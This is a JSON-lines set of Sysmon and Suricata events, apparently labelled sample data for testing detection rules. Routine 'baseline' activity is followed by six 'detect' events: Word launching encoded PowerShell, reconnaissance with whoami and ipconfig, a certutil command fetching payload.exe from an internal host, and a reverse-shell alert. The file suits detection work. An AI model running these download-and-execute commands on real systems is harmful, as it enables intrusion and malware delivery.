{"_time":"2026-05-26T09:00:10Z","host":"WIN-ENDPOINT-01","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","EventID":"1","Image":"C:\\Windows\\System32\\svchost.exe","ParentImage":"C:\\Windows\\System32\\services.exe","CommandLine":"svchost.exe -k netsvcs","sample_label":"baseline"}
{"_time":"2026-05-26T09:01:20Z","host":"WIN-ENDPOINT-01","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","EventID":"1","Image":"C:\\Windows\\System32\\notepad.exe","ParentImage":"C:\\Windows\\explorer.exe","CommandLine":"notepad.exe","sample_label":"baseline"}
{"_time":"2026-05-26T09:03:30Z","host":"WIN-ENDPOINT-01","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","EventID":"3","Image":"C:\\Windows\\System32\\svchost.exe","SourceIp":"10.10.10.15","DestinationIp":"10.10.10.1","DestinationPort":"53","Protocol":"udp","sample_label":"baseline"}
{"_time":"2026-05-26T09:15:10Z","host":"WIN-ENDPOINT-01","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","EventID":"1","Image":"C:\\Windows\\System32\\svchost.exe","ParentImage":"C:\\Windows\\System32\\services.exe","CommandLine":"svchost.exe -k netsvcs","sample_label":"baseline"}
{"_time":"2026-05-26T09:16:00Z","host":"WIN-ENDPOINT-01","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","EventID":"1","Image":"C:\\Windows\\System32\\notepad.exe","ParentImage":"C:\\Windows\\explorer.exe","CommandLine":"notepad.exe","sample_label":"baseline"}
{"_time":"2026-05-26T09:20:10Z","host":"WIN-ENDPOINT-01","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","EventID":"3","Image":"C:\\Windows\\System32\\svchost.exe","SourceIp":"10.10.10.15","DestinationIp":"10.10.10.1","DestinationPort":"53","Protocol":"udp","sample_label":"baseline"}
{"_time":"2026-05-26T09:30:10Z","host":"WIN-ENDPOINT-01","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","EventID":"1","Image":"C:\\Windows\\System32\\svchost.exe","ParentImage":"C:\\Windows\\System32\\services.exe","CommandLine":"svchost.exe -k netsvcs","sample_label":"baseline"}
{"_time":"2026-05-26T09:32:00Z","host":"WIN-ENDPOINT-01","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","EventID":"1","Image":"C:\\Windows\\System32\\notepad.exe","ParentImage":"C:\\Windows\\explorer.exe","CommandLine":"notepad.exe","sample_label":"baseline"}
{"_time":"2026-05-26T09:34:10Z","host":"WIN-ENDPOINT-01","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","EventID":"3","Image":"C:\\Windows\\System32\\svchost.exe","SourceIp":"10.10.10.15","DestinationIp":"10.10.10.1","DestinationPort":"53","Protocol":"udp","sample_label":"baseline"}
{"_time":"2026-05-26T09:45:10Z","host":"WIN-ENDPOINT-01","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","EventID":"1","Image":"C:\\Windows\\System32\\svchost.exe","ParentImage":"C:\\Windows\\System32\\services.exe","CommandLine":"svchost.exe -k netsvcs","sample_label":"baseline"}
{"_time":"2026-05-26T09:47:00Z","host":"WIN-ENDPOINT-01","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","EventID":"1","Image":"C:\\Windows\\System32\\notepad.exe","ParentImage":"C:\\Windows\\explorer.exe","CommandLine":"notepad.exe","sample_label":"baseline"}
{"_time":"2026-05-26T09:48:10Z","host":"WIN-ENDPOINT-01","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","EventID":"3","Image":"C:\\Windows\\System32\\svchost.exe","SourceIp":"10.10.10.15","DestinationIp":"10.10.10.1","DestinationPort":"53","Protocol":"udp","sample_label":"baseline"}
{"_time":"2026-05-26T10:30:05Z","host":"WIN-ENDPOINT-01","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","EventID":"1","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","CommandLine":"powershell.exe -NoP -EncodedCommand SQBFAFgA","sample_label":"detect"}
{"_time":"2026-05-26T10:30:25Z","host":"WIN-ENDPOINT-01","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","EventID":"1","Image":"C:\\Windows\\System32\\cmd.exe","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"cmd.exe /c whoami && ipconfig","sample_label":"detect"}
{"_time":"2026-05-26T10:31:05Z","host":"WIN-ENDPOINT-01","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","EventID":"1","Image":"C:\\Windows\\System32\\certutil.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","CommandLine":"certutil.exe -urlcache -f http://10.10.10.50/payload.exe payload.exe","sample_label":"detect"}
{"_time":"2026-05-26T10:31:35Z","host":"WIN-ENDPOINT-01","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","EventID":"3","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","SourceIp":"10.10.10.15","DestinationIp":"10.10.10.50","DestinationPort":"8080","Protocol":"tcp","sample_label":"detect"}
{"_time":"2026-05-26T10:31:45Z","host":"WIN-ENDPOINT-01","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","EventID":"3","Image":"C:\\Windows\\System32\\certutil.exe","SourceIp":"10.10.10.15","DestinationIp":"10.10.10.50","DestinationPort":"80","Protocol":"tcp","sample_label":"detect"}
{"_time":"2026-05-26T10:31:50Z","host":"ubuntu-siem","sourcetype":"suricata","_raw":"{\"timestamp\":\"2026-05-26T10:31:50Z\",\"event_type\":\"alert\",\"src_ip\":\"10.10.10.15\",\"dest_ip\":\"10.10.10.50\",\"dest_port\":4444,\"proto\":\"TCP\",\"alert\":{\"signature\":\"ET TROJAN Possible PowerShell Reverse Shell\",\"category\":\"A Network Trojan was detected\"}}","sample_label":"detect"}
